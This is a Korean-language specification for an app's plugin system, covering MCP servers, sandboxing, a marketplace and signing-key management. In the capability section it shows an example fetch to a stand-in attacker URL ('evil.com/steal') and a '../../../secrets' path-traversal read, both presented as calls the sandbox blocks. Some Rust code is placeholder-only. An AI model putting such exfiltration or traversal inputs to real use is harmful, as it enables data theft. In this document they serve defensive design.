# AIFlow — 플러그인 API 명세서 v1.0 (Phase 3)

> 생성: 2026-03-27 (v1.0)
> 대상: Phase 3 플러그인 시스템 — 생명주기, API, 보안 샌드박스, MCP 마켓

---

## 목차

1. [플러그인 시스템 개요](#1-플러그인-시스템-개요)
2. [플러그인 구조](#2-플러그인-구조)
3. [플러그인 생명주기](#3-플러그인-생명주기)
4. [AIFlow Plugin API](#4-aiflow-plugin-api)
5. [보안 샌드박스](#5-보안-샌드박스)
6. [MCP 서버 연동](#6-mcp-서버-연동)
7. [MCP 마켓플레이스](#7-mcp-마켓플레이스)
8. [플러그인 개발 가이드](#8-플러그인-개발-가이드)
9. [플러그인 검토 및 배포 절차](#9-플러그인-검토-및-배포-절차)
10. [확정된 설계 결정사항](#10-확정된-설계-결정사항)

---

## 1. 플러그인 시스템 개요

### 목적

AIFlow Phase 3에서 제3자 개발자가 AI 기능을 확장할 수 있는 안전한 플러그인 생태계 구축.

### 플러그인 종류

| 종류 | 설명 | 예시 |
|------|------|------|
| **MCP 서버** | Model Context Protocol 준수 외부 도구 | GitHub Copilot, Jira 연동, 날씨 API |
| **AI 페르소나** | 커스텀 시스템 프롬프트 + 아이콘 | 코드 리뷰어, 번역가, 창의적 작가 |
| **Export 포맷** | 새 내보내기 형식 추가 | Notion, Obsidian, Confluence |
| **UI 테마** | 색상 팔레트, 폰트 설정 | 라이트 모드, 고대비, 레트로 |
| **프롬프트 템플릿** | 반복 사용 프롬프트 | 이메일 작성, 코드 리팩토링 |

### 아키텍처 개요

```
AIFlow 앱 (Tauri)
├── Plugin Manager (Rust)
│   ├── 플러그인 설치/업데이트/제거
│   ├── 능력(capability) 검증
│   ├── 플러그인 레지스트리 (MCP 마켓)
│   └── 샌드박스 격리
│
├── Plugin Runtime (WebView 격리)
│   ├── 각 플러그인 → 별도 WebView iframe
│   ├── postMessage 기반 통신 (직접 DOM 접근 금지)
│   └── 제한된 AIFlow Plugin API만 노출
│
└── MCP Bridge (Rust)
    ├── MCP 서버 프로세스 관리
    ├── JSON-RPC 2.0 통신
    └── 경로 화이트리스트 검증
```

---

## 2. 플러그인 구조

### 플러그인 디렉토리 구조

```
my-plugin/
├── plugin.json          ← 필수: 플러그인 메타데이터
├── icon.svg             ← 권장: 44×44px SVG 아이콘
├── README.md            ← 권장: 사용자 문서
├── LICENSE              ← 필수: 라이선스 파일
│
├── src/
│   ├── index.ts         ← MCP 서버 / UI 플러그인 진입점
│   └── ...
│
└── dist/
    ├── index.js         ← 빌드된 파일 (배포 시)
    └── ...
```

### `plugin.json` 명세

```json
{
  "$schema": "https://aiflow.app/schemas/plugin/v1.json",

  "id": "com.example.github-mcp",
  "name": "GitHub MCP",
  "version": "1.2.0",
  "description": "GitHub 이슈, PR, 코드를 AI와 함께 분석합니다.",
  "author": {
    "name": "Example Corp",
    "email": "dev@example.com",
    "url": "https://example.com"
  },

  "type": "mcp-server",
  "entrypoint": "dist/index.js",
  "runtime": "node",
  "minAiflowVersion": "1.2.0",

  "capabilities": [
    "network:github.com",
    "env:GITHUB_TOKEN"
  ],

  "mcp": {
    "tools": ["get_issue", "list_prs", "get_file_content"],
    "resources": ["github://repos/{owner}/{repo}"],
    "prompts": ["code-review-prompt"]
  },

  "permissions": {
    "network": ["github.com", "api.github.com"],
    "env": ["GITHUB_TOKEN"],
    "filesystem": false,
    "clipboard": false
  },

  "category": "developer-tools",
  "tags": ["github", "code-review", "productivity"],

  "changelog": {
    "1.2.0": "PR 코멘트 기능 추가",
    "1.1.0": "파일 내용 조회 추가",
    "1.0.0": "초기 출시"
  }
}
```

### 허용 `type` 값

| type | 설명 |
|------|------|
| `mcp-server` | MCP 프로토콜 준수 외부 도구 서버 |
| `persona` | AI 페르소나 (시스템 프롬프트 + 메타데이터) |
| `export-format` | 내보내기 포맷 플러그인 |
| `theme` | UI 테마 플러그인 |
| `prompt-template` | 프롬프트 템플릿 컬렉션 |

---

## 3. 플러그인 생명주기

### 상태 다이어그램

```
[없음]
  │
  ▼ 설치 (install)
[설치됨 / 비활성]
  │                    ┌── 설정 변경 → [설정됨]
  ▼ 활성화 (activate) ─┤
[활성 / 초기화 중]      └── 에러 → [활성화 실패]
  │
  ▼ 초기화 완료 (ready)
[활성 / 실행 중]
  │
  ├── 에러 발생 → [에러 상태] → 자동 재시도 3회 → [비활성]
  │
  ▼ 비활성화 (deactivate)
[설치됨 / 비활성]
  │
  ▼ 제거 (uninstall)
[없음]
```

### 생명주기 이벤트 (Plugin 수신)

```typescript
// MCP 서버 플러그인이 구현해야 하는 이벤트

interface PluginLifecycle {
  // 플러그인 초기화 (activate 후 호출)
  onActivate(context: PluginContext): Promise<void>;

  // 플러그인 정리 (deactivate 전 호출)
  onDeactivate(): Promise<void>;

  // 설정 변경 시 호출
  onConfigChange(config: Record<string, unknown>): Promise<void>;

  // AIFlow 버전 업그레이드 후 호출
  onUpgrade(previousVersion: string, currentVersion: string): Promise<void>;
}
```

### `PluginContext` 객체

```typescript
interface PluginContext {
  plugin: {
    id: string;
    version: string;
    dataDir: string;    // %APPDATA%\aiflow\plugins\{id}\data\ (읽기/쓰기 허용)
    cacheDir: string;   // %LOCALAPPDATA%\aiflow\plugins\{id}\cache\
  };

  // 플러그인이 요청한 환경 변수 (permissions.env에 명시된 것만)
  env: (key: string) => string | undefined;

  // 플러그인 설정 (사용자가 설정 UI에서 입력한 값)
  config: PluginConfigStore;

  // 로깅 (AIFlow 로그 패널에 표시)
  logger: {
    info: (message: string) => void;
    warn: (message: string) => void;
    error: (message: string, error?: Error) => void;
  };
}
```

---

## 4. AIFlow Plugin API

### API 범위 원칙

- 플러그인은 AIFlow가 노출하는 API만 사용 가능
- Tauri API 직접 호출 금지 (postMessage 격리)
- 능력(capabilities) 선언 없는 리소스 접근 시 자동 차단

### 4.1 AI API (`aiflow.ai`)

```typescript
interface AIApi {
  // AI 텍스트 생성 (스트리밍)
  stream(options: {
    prompt: string;
    systemPrompt?: string;
    provider?: string;    // 미지정 시 스마트 라우팅
    maxTokens?: number;
    temperature?: number;
  }): AsyncIterable<string>;

  // AI 텍스트 생성 (단회)
  generate(options: {
    prompt: string;
    systemPrompt?: string;
    provider?: string;
    maxTokens?: number;
  }): Promise<{
    content: string;
    tokenCount: { in: number; out: number };
    costUsd: number;
    provider: string;
  }>;

  // 임베딩 생성
  embed(text: string): Promise<number[]>;
}
```

### 4.2 UI API (`aiflow.ui`)

```typescript
interface UIApi {
  // 토스트 알림 표시
  showToast(options: {
    message: string;
    type: 'info' | 'success' | 'warning' | 'error';
    duration?: number;  // ms, 기본 3000
  }): void;

  // 확인 다이얼로그
  showConfirm(options: {
    title: string;
    message: string;
    confirmLabel?: string;
    cancelLabel?: string;
  }): Promise<boolean>;

  // 진행률 표시 (오버레이 내)
  showProgress(options: {
    id: string;         // 유니크 ID (업데이트/제거용)
    message: string;
    percent?: number;   // 0-100, 미지정 시 indeterminate
  }): void;

  hideProgress(id: string): void;

  // 플러그인 설정 패널 열기
  openSettings(): void;
}
```

### 4.3 스토리지 API (`aiflow.storage`)

```typescript
interface StorageApi {
  // 키-값 저장소 (암호화됨, 플러그인 격리)
  set(key: string, value: unknown): Promise<void>;
  get<T>(key: string): Promise<T | undefined>;
  delete(key: string): Promise<void>;
  clear(): Promise<void>;

  // 파일 저장소 (plugin.dataDir 내부로 제한)
  readFile(path: string): Promise<Uint8Array>;
  writeFile(path: string, data: Uint8Array): Promise<void>;
  deleteFile(path: string): Promise<void>;
  listFiles(dir?: string): Promise<string[]>;
}
```

### 4.4 네트워크 API (`aiflow.network`)

```typescript
interface NetworkApi {
  // HTTP 요청 (permissions.network에 선언된 도메인만)
  fetch(url: string, options?: {
    method?: 'GET' | 'POST' | 'PUT' | 'DELETE' | 'PATCH';
    headers?: Record<string, string>;
    body?: string | Uint8Array;
    timeout?: number;    // ms, 기본 30000
  }): Promise<{
    status: number;
    headers: Record<string, string>;
    body: () => Promise<Uint8Array>;
    text: () => Promise<string>;
    json: <T>() => Promise<T>;
  }>;
}
```

### 4.5 이벤트 API (`aiflow.events`)

```typescript
interface EventsApi {
  // AIFlow 이벤트 구독
  on(event: AiflowEvent, handler: (data: unknown) => void): () => void; // 반환값: unsubscribe 함수

  // 이벤트 목록
  type AiflowEvent =
    | 'message:sent'        // 사용자 메시지 전송 시 {content: string}
    | 'message:received'    // AI 응답 완료 시 {content: string, provider: string}
    | 'conversation:new'    // 새 대화 시작 시
    | 'provider:changed'    // AI 제공자 변경 시 {provider: string}
    | 'privacy:changed'     // 프라이버시 모드 변경 시 {active: boolean}
    | 'app:focus'           // 오버레이 포커스 시
    | 'app:blur';           // 오버레이 포커스 해제 시
}
```

---

## 5. 보안 샌드박스

### 격리 아키텍처

```
AIFlow 메인 프로세스 (Tauri)
│
├── Plugin Manager (신뢰됨)
│   └── 능력 검증, 설치 관리
│
└── Plugin WebView (격리됨)
    ├── CSP: default-src 'none'; script-src 'self'
    ├── 독립 origin (aiflow-plugin://{plugin-id}/)
    ├── localStorage, indexedDB: 플러그인별 격리
    └── postMessage 채널만 통신 가능

플러그인 → postMessage → Plugin Bridge → 능력 검증 → AIFlow API
                                              │
                                              └── 거부 시: SecurityError 반환
```

### 능력(Capability) 시스템

```typescript
// plugin.json의 permissions 선언과 실제 API 호출이 일치해야 함

// 선언:
"permissions": {
  "network": ["github.com", "api.github.com"],
  "env": ["GITHUB_TOKEN"],
  "filesystem": false
}

// 허용되는 호출:
await aiflow.network.fetch("https://api.github.com/repos/...");   // ✅
await aiflow.network.fetch("https://evil.com/steal");             // ❌ SecurityError

// 허용되지 않는 능력:
await aiflow.storage.readFile("../../../secrets");                // ❌ 경로 traversal 차단
```

### Rust 능력 검증 코드

```rust
// src-tauri/src/plugin/sandbox.rs

use std::collections::HashSet;

#[derive(Debug, Clone)]
pub struct PluginCapabilities {
    pub allowed_domains: HashSet<String>,
    pub allowed_env_keys: HashSet<String>,
    pub filesystem_access: bool,
    pub clipboard_access: bool,
}

impl PluginCapabilities {
    pub fn from_manifest(manifest: &PluginManifest) -> Result<Self> {
        // 각 도메인 유효성 검증 (IP, localhost 금지)
        let allowed_domains = manifest.permissions.network
            .iter()
            .map(|domain| validate_domain(domain))
            .collect::<Result<HashSet<_>>>()?;

        Ok(Self {
            allowed_domains,
            allowed_env_keys: manifest.permissions.env.iter().cloned().collect(),
            filesystem_access: manifest.permissions.filesystem,
            clipboard_access: manifest.permissions.clipboard,
        })
    }

    pub fn check_network(&self, url: &str) -> Result<()> {
        let parsed = url::Url::parse(url)?;
        let host = parsed.host_str().ok_or(PluginError::InvalidUrl)?;

        // localhost / 사설 IP 금지
        if is_private_address(host) {
            return Err(PluginError::SecurityViolation(
                format!("Private network access denied: {host}")
            ));
        }

        // 화이트리스트 확인 (서브도메인 포함)
        let allowed = self.allowed_domains.iter().any(|domain| {
            host == domain || host.ends_with(&format!(".{domain}"))
        });

        if !allowed {
            return Err(PluginError::SecurityViolation(
                format!("Network access to {host} not in declared permissions")
            ));
        }

        Ok(())
    }

    pub fn check_filesystem(&self, path: &std::path::Path, data_dir: &std::path::Path) -> Result<()> {
        if !self.filesystem_access {
            return Err(PluginError::SecurityViolation(
                "Filesystem access not declared".to_string()
            ));
        }

        // data_dir 외부 경로 접근 차단 (path traversal)
        let canonical = path.canonicalize().map_err(|_| PluginError::InvalidPath)?;
        if !canonical.starts_with(data_dir) {
            return Err(PluginError::SecurityViolation(
                "Path traversal attempt detected".to_string()
            ));
        }

        Ok(())
    }
}

fn is_private_address(host: &str) -> bool {
    // 127.x, 10.x, 172.16-31.x, 192.168.x, ::1, localhost
    matches!(host, "localhost" | "127.0.0.1" | "::1")
        || host.starts_with("10.")
        || host.starts_with("192.168.")
        || {
            let parts: Vec<_> = host.split('.').collect();
            parts.len() == 4
                && parts[0] == "172"
                && parts[1].parse::<u8>().map(|n| (16..=31).contains(&n)).unwrap_or(false)
        }
}
```

### 리소스 제한

| 리소스 | 제한값 | 초과 시 동작 |
|--------|--------|------------|
| CPU | 25% (단일 코어 기준) | 프로세스 throttling |
| 메모리 | 128MB | OOM → 플러그인 재시작 |
| 네트워크 요청/분 | 60회 | 429 에러 반환 |
| 스토리지 | 100MB | QuotaExceeded 에러 |
| 동시 AI 요청 | 1회 | 이전 요청 완료 후 처리 |

---

## 6. MCP 서버 연동

### MCP (Model Context Protocol) 개요

MCP는 AI 모델이 외부 도구·리소스와 통신하는 표준 프로토콜 (JSON-RPC 2.0 기반).

```
AI 모델 ↔ MCP Client (AIFlow) ↔ MCP Server (플러그인)
                                    ├── Tools (함수 호출)
                                    ├── Resources (데이터 접근)
                                    └── Prompts (프롬프트 템플릿)
```

### MCP 서버 구현 예시 (Node.js)

```typescript
// dist/index.js (빌드 결과물)
import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';

const server = new Server(
  { name: 'github-mcp', version: '1.2.0' },
  { capabilities: { tools: {}, resources: {}, prompts: {} } }
);

// Tool 등록: get_issue
server.setRequestHandler('tools/call', async (request) => {
  if (request.params.name === 'get_issue') {
    const { owner, repo, number } = request.params.arguments;

    // AIFlow가 주입한 환경변수 사용
    const token = process.env.GITHUB_TOKEN;
    if (!token) throw new Error('GITHUB_TOKEN not configured');

    const response = await fetch(
      `https://api.github.com/repos/${owner}/${repo}/issues/${number}`,
      { headers: { Authorization: `Bearer ${token}` } }
    );

    const issue = await response.json();
    return {
      content: [{
        type: 'text',
        text: JSON.stringify(issue, null, 2)
      }]
    };
  }
});

// Tool 목록 반환
server.setRequestHandler('tools/list', async () => ({
  tools: [
    {
      name: 'get_issue',
      description: 'GitHub 이슈 상세 정보 조회',
      inputSchema: {
        type: 'object',
        properties: {
          owner: { type: 'string', description: '레포지토리 소유자' },
          repo: { type: 'string', description: '레포지토리 이름' },
          number: { type: 'number', description: '이슈 번호' }
        },
        required: ['owner', 'repo', 'number']
      }
    }
  ]
}));

const transport = new StdioServerTransport();
await server.connect(transport);
```

### MCP 서버 프로세스 관리 (Rust)

```rust
// src-tauri/src/plugin/mcp_manager.rs

use std::process::{Child, Command, Stdio};
use tokio::sync::Mutex;

pub struct McpProcess {
    child: Mutex<Child>,
    plugin_id: String,
    capabilities: PluginCapabilities,
}

impl McpProcess {
    pub async fn spawn(plugin: &PluginManifest, data_dir: &Path) -> Result<Self> {
        // 능력 검증
        let capabilities = PluginCapabilities::from_manifest(plugin)?;

        // 환경 변수: 허용된 키만 전달
        let env_vars = collect_allowed_env(
            &plugin.permissions.env,
            &plugin.id,
        )?;

        let child = Command::new("node")
            .arg(plugin.entrypoint_path(data_dir))
            .stdin(Stdio::piped())
            // ⚠️ SECURITY: stdout 읽기 최대 10MB 제한 필수
            // send_request() 에서 BufReader::take(10 * 1024 * 1024) 사용
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // 허용된 환경 변수만 전달 (부모 환경 상속 금지)
            .env_clear()
            .envs(env_vars)
            // 작업 디렉토리: 플러그인 data_dir로 제한
            .current_dir(data_dir.join(&plugin.id))
            .spawn()?;

        // ⚠️ SECURITY: Windows Job Object로 CPU/메모리 Hard Limit 적용
        // env_clear()만으로는 Node.js child_process/fs/net 모듈 사용이 막히지 않음
        // Job Object 없이 CPU 25%/메모리 128MB 제한은 선언에 불과 — 반드시 적용
        #[cfg(target_os = "windows")]
        apply_job_object_limits(&child, JobLimits {
            cpu_rate_percent: 25,        // 전체 CPU의 25%
            max_memory_bytes: 128 * 1024 * 1024, // 128MB
        })?;

        Ok(McpProcess {
            child: Mutex::new(child),
            plugin_id: plugin.id.clone(),
            capabilities,
        })
    }

    pub async fn call_tool(&self, name: &str, args: serde_json::Value) -> Result<serde_json::Value> {
        // JSON-RPC 2.0 요청 전송
        let request = serde_json::json!({
            "jsonrpc": "2.0",
            "id": uuid::Uuid::new_v4().to_string(),
            "method": "tools/call",
            "params": {
                "name": name,
                "arguments": args
            }
        });

        self.send_request(request).await
    }
}
```

### Windows Job Object 리소스 제한 (v3.6 신규 — CRITICAL)

```rust
// src-tauri/src/plugin/job_object.rs
// ⚠️ env_clear()만으로는 Node.js 런타임 수준 격리 불가
// Windows Job Object로 CPU/메모리를 OS 커널 레벨에서 강제

#[cfg(target_os = "windows")]
use windows::Win32::System::JobObjects::*;

pub struct JobLimits {
    pub cpu_rate_percent: u32,   // 0-100
    pub max_memory_bytes: u64,
}

#[cfg(target_os = "windows")]
pub fn apply_job_object_limits(child: &std::process::Child, limits: JobLimits) -> Result<()> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Threading::OpenProcess;

    unsafe {
        let job = CreateJobObjectW(None, None)?;

        // CPU 레이트 제한
        let cpu_info = JOBOBJECT_CPU_RATE_CONTROL_INFORMATION {
            ControlFlags: JOB_OBJECT_CPU_RATE_CONTROL_ENABLE
                | JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP,
            Anonymous: JOBOBJECT_CPU_RATE_CONTROL_INFORMATION_0 {
                CpuRate: limits.cpu_rate_percent * 100, // 단위: 0.01%
            },
        };
        SetInformationJobObject(job, JobObjectCpuRateControlInformation, ...)?;

        // 메모리 제한
        let mem_info = JOBOBJECT_EXTENDED_LIMIT_INFORMATION {
            BasicLimitInformation: JOBOBJECT_BASIC_LIMIT_INFORMATION {
                LimitFlags: JOB_OBJECT_LIMIT_JOB_MEMORY,
                ..Default::default()
            },
            JobMemoryLimit: limits.max_memory_bytes as usize,
            ..Default::default()
        };
        SetInformationJobObject(job, JobObjectExtendedLimitInformation, ...)?;

        let process = OpenProcess(PROCESS_ALL_ACCESS, false, child.id())?;
        AssignProcessToJobObject(job, process)?;
    }
    Ok(())
}

// stdout 10MB 제한 — DoS 방지
pub fn read_limited_stdout(reader: impl Read) -> Result<Vec<u8>> {
    const MAX_BYTES: u64 = 10 * 1024 * 1024; // 10MB
    let mut buf = Vec::new();
    reader.take(MAX_BYTES).read_to_end(&mut buf)?;
    Ok(buf)
}
```

### MCP 보안 검증 (TOCTOU 방지)

```rust
// 05_SECURITY_SPEC.md의 MCP TOCTOU 취약점 해소

fn validate_mcp_server_path(plugin_id: &str, claimed_path: &Path, data_dir: &Path) -> Result<()> {
    let plugin_dir = data_dir.join(plugin_id);

    // 1. canonicalize로 심링크 해소 (TOCTOU 방지)
    let canonical = claimed_path.canonicalize()
        .map_err(|_| PluginError::InvalidPath)?;

    // 2. 플러그인 디렉토리 내부인지 확인
    if !canonical.starts_with(&plugin_dir) {
        return Err(PluginError::SecurityViolation(
            "MCP server path outside plugin directory".to_string()
        ));
    }

    // 3. 실행 파일 확장자 검증
    match canonical.extension().and_then(|e| e.to_str()) {
        Some("js") | Some("mjs") => Ok(()),
        _ => Err(PluginError::InvalidEntrypoint(
            "Only .js and .mjs entrypoints are allowed".to_string()
        ))
    }
}
```

---

## 7. MCP 마켓플레이스

### 마켓 아키텍처

```
AIFlow 앱 (Settings > MCP 마켓)
    │
    └── GET https://market.aiflow.app/api/v1/plugins
            Response: 플러그인 목록 (검증됨)
            ├── 검색, 카테고리 필터
            ├── 버전 정보, 다운로드 수
            └── 보안 검토 상태 배지
```

### 마켓 API (Backend)

```typescript
// 마켓 API 응답 형식

interface MarketPlugin {
  id: string;                    // 'com.github.official-mcp'
  name: string;
  description: string;
  author: string;
  version: string;
  category: PluginCategory;
  tags: string[];
  downloadCount: number;
  rating: number;                // 1-5
  reviewStatus: 'verified' | 'community' | 'unreviewed';
  downloadUrl: string;           // 서명된 다운로드 URL (24시간 유효)
  sha256: string;                // 무결성 검증
  publishedAt: string;
  updatedAt: string;
  minAiflowVersion: string;
  permissions: PermissionSummary;
}

type PluginCategory =
  | 'developer-tools'
  | 'productivity'
  | 'writing'
  | 'data-analysis'
  | 'communication'
  | 'other';
```

### 설치 프로세스

```
사용자: [설치] 클릭
    │
    ▼
1. 마켓 API에서 서명된 다운로드 URL 획득
    │
    ▼
2. 플러그인 패키지 (.aiflow-plugin 또는 .zip) 다운로드
    │
    ▼
3. SHA-256 해시 검증 (무결성)
    │
    ▼
4. 디지털 서명 검증 (AIFlow 마켓 공개키)
    │
    ▼
5. plugin.json 파싱 및 능력 검토
    │
    ▼
6. 권한 승인 다이얼로그 (사용자 명시적 동의)
   ┌─────────────────────────────────────────┐
   │  🔑 GitHub MCP 플러그인이 요청하는 권한  │
   │                                          │
   │  ✓ 인터넷 접근: github.com              │
   │  ✓ 환경 변수: GITHUB_TOKEN             │
   │  ✗ 파일 시스템 접근: 없음              │
   │  ✗ 클립보드 접근: 없음                 │
   │                                          │
   │     [취소]    [허용하고 설치]           │
   └─────────────────────────────────────────┘
    │
    ▼
7. 플러그인 격리 디렉토리에 추출
8. AuditLog에 설치 기록 (plugin_id, version, permissions)
9. 활성화
```

### 플러그인 업데이트

```rust
// src-tauri/src/plugin/updater.rs

pub async fn check_plugin_updates(manager: &PluginManager) -> Vec<PluginUpdate> {
    let installed = manager.list_installed().await;

    futures::stream::iter(installed)
        .filter_map(|plugin| async move {
            let latest = fetch_latest_version(&plugin.id).await.ok()?;
            if semver::Version::parse(&latest.version).ok()?
                > semver::Version::parse(&plugin.version).ok()?
            {
                Some(PluginUpdate {
                    plugin_id: plugin.id,
                    current_version: plugin.version,
                    latest_version: latest.version,
                    changelog: latest.changelog,
                })
            } else {
                None
            }
        })
        .collect()
        .await
}
```

---

## 8. 플러그인 개발 가이드

### 개발 환경 설정

```bash
# AIFlow Plugin CLI 설치
npm install -g @aiflow/plugin-cli

# 새 플러그인 프로젝트 생성
aiflow-plugin create my-plugin --type mcp-server

# 개발 서버 (로컬 테스트)
aiflow-plugin dev

# 빌드
aiflow-plugin build

# 로컬 설치 (개발 중 테스트)
aiflow-plugin install --local ./dist
```

### 로컬 플러그인 테스트

AIFlow 설정 > 개발자 > "로컬 플러그인 로드" 기능으로 미검토 플러그인 테스트 가능 (기본 비활성).

```json
// plugin.json에 개발 모드 플래그 추가
{
  "devMode": true,
  "hotReload": true  // 파일 변경 시 자동 재로드
}
```

### 플러그인 디버깅

```typescript
// 플러그인 내 로깅 → AIFlow 로그 패널에 표시
context.logger.info('Plugin activated successfully');
context.logger.error('API call failed', error);

// AIFlow 설정 > 개발자 > 플러그인 로그에서 확인
```

### 테스트 작성

```typescript
// __tests__/plugin.test.ts
import { createMockContext } from '@aiflow/plugin-test-utils';
import { activate } from '../src/index';

describe('GitHub MCP Plugin', () => {
  it('fetches issue successfully', async () => {
    const context = createMockContext({
      env: { GITHUB_TOKEN: 'test-token' },
      network: {
        'api.github.com': mockGitHubApi,
      }
    });

    await activate(context);

    const result = await context.tools.call('get_issue', {
      owner: 'sodamai', repo: 'aiflow', number: 1
    });

    expect(result.content[0].text).toContain('AIFlow');
  });
});
```

---

## 9. 플러그인 검토 및 배포 절차

### 검토 등급

| 등급 | 배지 | 기준 |
|------|------|------|
| **Verified** | ✅ 검증됨 | AIFlow 팀 수동 코드 리뷰 통과 |
| **Community** | 👥 커뮤니티 | 자동 보안 스캔 통과, 100+ 설치 |
| **Unreviewed** | ⚠️ 미검토 | 자동 스캔만 완료 |

### 배포 절차

```
1. 플러그인 빌드 + 테스트 통과
        │
        ▼
2. aiflow-plugin publish (CLI)
   → AIFlow 마켓에 업로드
        │
        ▼
3. 자동 보안 스캔:
   - 정적 분석 (capabilities vs 실제 코드 비교)
   - 알려진 악성 패턴 탐지
   - 과도한 권한 요청 경고
        │
        ▼
4. Unreviewed 상태로 마켓 등록
        │
        ▼
5. [선택] Verified 신청 → AIFlow 팀 수동 리뷰 (2주 내)
        │
        ▼
6. Verified 승인 → 마켓 추천 목록 등재
```

### 플러그인 정책 위반 시

- 자동 감지: 마켓에서 즉시 제거 + 사용자 설치본 비활성화
- 보안 취약점: 취약 버전 사용자에게 자동 업데이트 또는 비활성화 알림
- AuditLog에 비활성화 사유 기록

---

## 10. 확정된 설계 결정사항

| # | 항목 | 확정값 |
|---|------|--------|
| 1 | 플러그인 런타임 | Node.js (MCP 서버), WebView iframe (UI) |
| 2 | 통신 방식 | postMessage (UI) + stdin/stdout JSON-RPC (MCP) |
| 3 | 격리 단위 | 플러그인별 별도 WebView origin |
| 4 | 능력 시스템 | plugin.json 선언 + Rust 런타임 검증 |
| 5 | 네트워크 제한 | 선언된 도메인만 허용, localhost/사설IP 금지 |
| 6 | 파일시스템 제한 | plugin.dataDir 내부만 허용 (기본 비활성) |
| 7 | TOCTOU 방지 | canonicalize() 후 경로 검증 |
| 8 | 리소스 제한 | CPU 25%, 메모리 128MB, 네트워크 60req/분 |
| 9 | 마켓 배포 | AIFlow 마켓 (market.aiflow.app) |
| 10 | 검토 단계 | Unreviewed → Community → Verified |
| 11 | 디지털 서명 | 모든 플러그인 패키지 AIFlow 마켓키로 서명 (Ed25519) |
| 12 | Phase 3 시작 | v2.0 이후 플러그인 API 공개 |
| 13 | 서명 키 저장 | Azure Key Vault HSM (FIPS 140-2 Level 3) |
| 14 | 서명 키 로테이션 | 연 1회 (보안 사고 시 즉시) |
| 15 | 공개키 배포 | 앱 번들 내 `assets/market_public_key.pem` |

---

## 11. 플러그인 서명 키 관리 정책 (v1.1 신규)

> **왜 Ed25519인가**: RSA-2048보다 키 크기 ~10배 작고, 서명/검증 속도 ~100배 빠름.
> 양자 컴퓨터 공격에도 현재 기준 안전. 마켓플레이스 표준 (npm, PyPI 방향).

### 키 체계

```
마켓 루트 키 (오프라인 Cold Storage)
  └── 마켓 서명 키 (Azure Key Vault HSM, 온라인)
        ├── 플러그인 서명 (배포 시마다 사용)
        └── 긴급 폐기 서명 (보안 사고 시)
```

### 키 생성 절차

```bash
# 1. Ed25519 키 페어 생성 (오프라인 환경에서)
openssl genpkey -algorithm ed25519 -out market_private_key.pem
openssl pkey -in market_private_key.pem -pubout -out market_public_key.pem

# 2. 개인 키 → Azure Key Vault HSM 업로드
az keyvault key import \
  --vault-name aiflow-market-vault \
  --name market-signing-key \
  --pem-file market_private_key.pem \
  --protection hsm  # HSM 보호 (소프트웨어 추출 불가)

# 3. 개인 키 원본 즉시 파기 (HSM 업로드 후)
shred -u market_private_key.pem

# 4. 공개 키 → 앱 번들에 포함
cp market_public_key.pem src-tauri/assets/market_public_key.pem
```

### 플러그인 서명 절차

```rust
// src-tauri/src/market/signing.rs — 서명 검증 (클라이언트 사이드)
use ed25519_dalek::{Signature, Verifier, VerifyingKey};

/// 앱에 번들된 마켓 공개키
const MARKET_PUBLIC_KEY: &[u8] = include_bytes!("../../assets/market_public_key.pem");

pub fn verify_plugin_signature(
    plugin_package: &[u8],   // .zip 바이트
    signature_b64: &str,     // 마켓에서 받은 서명 (Base64)
) -> Result<(), String> {
    // 1. 공개키 로드
    let public_key = VerifyingKey::from_pem(
        std::str::from_utf8(MARKET_PUBLIC_KEY).unwrap()
    ).map_err(|_| "PLUGIN_001: 마켓 공개키 로드 실패".to_string())?;

    // 2. 서명 디코드
    let sig_bytes = base64::decode(signature_b64)
        .map_err(|_| "PLUGIN_002: 서명 형식 오류".to_string())?;
    let signature = Signature::from_slice(&sig_bytes)
        .map_err(|_| "PLUGIN_002: 서명 파싱 실패".to_string())?;

    // 3. 패키지 해시 계산 (SHA-256)
    use ring::digest;
    let hash = digest::digest(&digest::SHA256, plugin_package);

    // 4. 서명 검증
    public_key
        .verify(hash.as_ref(), &signature)
        .map_err(|_| "PLUGIN_003: 서명 검증 실패 — 플러그인이 변조되었을 수 있습니다".to_string())?;

    Ok(())
}
```

```bash
# 마켓 서버 사이드: 플러그인 서명 (배포 파이프라인)
# Azure Key Vault로 서명 (개인키는 HSM 외부로 절대 나오지 않음)
az keyvault key sign \
  --vault-name aiflow-market-vault \
  --name market-signing-key \
  --algorithm Ed25519 \
  --digest "$(sha256sum plugin-package.zip | cut -d' ' -f1)" \
  --output tsv --query result
```

### 키 로테이션 절차

| 단계 | 작업 | 담당 |
|------|------|------|
| 1 | 새 Ed25519 키 페어 생성 (오프라인) | 보안 책임자 |
| 2 | 새 개인키 → Azure Key Vault HSM 업로드 | DevOps |
| 3 | 새 공개키 → 앱 번들 업데이트 (`market_public_key.pem`) | DevOps |
| 4 | 새 키로 서명된 앱 릴리즈 배포 | DevOps |
| 5 | 이전 키로 서명된 플러그인 재서명 (72시간 이내) | 자동화 |
| 6 | 이전 키 Azure Key Vault에서 비활성화 | 보안 책임자 |
| 7 | 키 로테이션 AuditLog 기록 | 자동 |

**로테이션 주기**: 연 1회 (1월 첫째 주)
**긴급 로테이션 트리거**:
- Azure Key Vault 접근 이상 감지
- 보안 사고 (개인키 유출 의심)
- 알고리즘 취약점 발견

### 키 폐기 (Emergency Revocation)

```json
// 앱 번들 내 revocation.json (앱 업데이트 없이 원격 업데이트)
// 경로: https://market.aiflow.app/api/v1/revocation.json
{
  "revoked_keys": [
    {
      "key_fingerprint": "SHA256:abc123...",
      "revoked_at": "2026-01-15T09:00:00Z",
      "reason": "scheduled_rotation",
      "replacement_key": "SHA256:def456..."
    }
  ],
  "last_updated": "2026-01-15T09:00:00Z"
}
```

```rust
// 앱 시작 시 폐기 목록 확인
pub async fn check_key_revocation(client: &reqwest::Client) -> Result<(), String> {
    let revocation: RevocationList = client
        .get("https://market.aiflow.app/api/v1/revocation.json")
        .timeout(Duration::from_secs(5))
        .send()
        .await?
        .json()
        .await?;

    let current_key_fp = compute_key_fingerprint(MARKET_PUBLIC_KEY);

    if revocation.revoked_keys.iter().any(|r| r.key_fingerprint == current_key_fp) {
        // 현재 번들 공개키가 폐기됨 → 앱 업데이트 강제
        return Err("PLUGIN_004: 마켓 서명 키가 폐기되었습니다. 앱을 업데이트해주세요.".to_string());
    }

    Ok(())
}
```

### 보안 체크리스트

